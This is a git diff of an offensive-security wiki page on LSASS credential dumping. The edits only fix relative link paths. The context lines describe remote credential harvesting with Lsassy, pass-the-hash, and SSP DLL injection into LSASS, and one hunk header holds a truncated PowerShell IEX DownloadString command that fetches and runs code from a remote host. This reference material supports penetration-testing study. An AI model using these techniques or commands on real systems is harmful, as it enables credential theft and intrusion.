@@ -20,7 +20,7 @@ The Local Security Authority Subsystem Service (LSASS) is a Windows service resp
 LSASS services are reachable trough RPC
 {% endhint %}
 
-<figure><img src="../../../../../.gitbook/assets/lsass-rpc-shcema.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/lsass-rpc-shcema.png" alt=""><figcaption></figcaption></figure>
 
 ## Practice
 
@@ -33,7 +33,7 @@ LSASS operations lead to the storage of credential material in its process memor
 [Lsassy](https://github.com/Hackndo/lsassy) (Python) can be used to remotely extract credentials, from LSASS, on multiple hosts. As of today (22/07/2020), it is the Rolls-Royce of remote lsass credential harvesting.
 
 * several dumping methods: comsvcs.dll, [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [Dumpert](https://github.com/outflanknl/Dumpert)
-* several authentication methods: like [pass-the-hash](../../../../../ad/movement/ntlm/pth.md) (NTLM), or [pass-the-ticket](../../../../../ad/movement/kerberos/ptt.md) (Kerberos)
+* several authentication methods: like [pass-the-hash](../../../../ad/movement/ntlm/pth.md) (NTLM), or [pass-the-ticket](../../../../ad/movement/kerberos/ptt.md) (Kerberos)
 * it can be used either as a standalone script, as a [NetExec](https://github.com/Pennyw0rth/NetExec) module or as a Python library
 * it can interact with a Neo4j database to set [BloodHound](https://github.com/BloodHoundAD/BloodHound) targets as "owned"
 
@@ -122,14 +122,14 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5
 {% endtabs %}
 
 {% hint style="info" %}
-Recovered credential material could be either plaintext passwords or NT hash that can be used with [pass the hash](../../../../../ad/movement/ntlm/pth.md) (depending on the context).
+Recovered credential material could be either plaintext passwords or NT hash that can be used with [pass the hash](../../../../ad/movement/ntlm/pth.md) (depending on the context).
 {% endhint %}
 
 #### Security Support Provider DLLs
 
 We may abuse [security support providers (SSPs)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) to injected into LSASS.exe process custom SSP DLLs. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.
 
-We can directly **inject** [**SSP DLLs**](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) **into memory**. It prevent us from editing registries but using this approach, it will not persist accross reboot like with [this method](../../../../persistence/windows/lsa/security-support-provider-dlls.md).
+We can directly **inject** [**SSP DLLs**](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) **into memory**. It prevent us from editing registries but using this approach, it will not persist accross reboot like with [this method](../../../persistence/windows/lsa/security-support-provider-dlls.md).
 
 {% tabs %}
 {% tab title="Mimikatz" %}
@@ -208,8 +208,8 @@ extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVer
 
 Alternatively, we may modify LSA Registry keys to add new SSPs which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called :
 
-{% content-ref url="../../../../persistence/windows/lsa/security-support-provider-dlls.md" %}
-[security-support-provider-dlls.md](../../../../persistence/windows/lsa/security-support-provider-dlls.md)
+{% content-ref url="../../../persistence/windows/lsa/security-support-provider-dlls.md" %}
+[security-support-provider-dlls.md](../../../persistence/windows/lsa/security-support-provider-dlls.md)
 {% endcontent-ref %}
 
 ## References
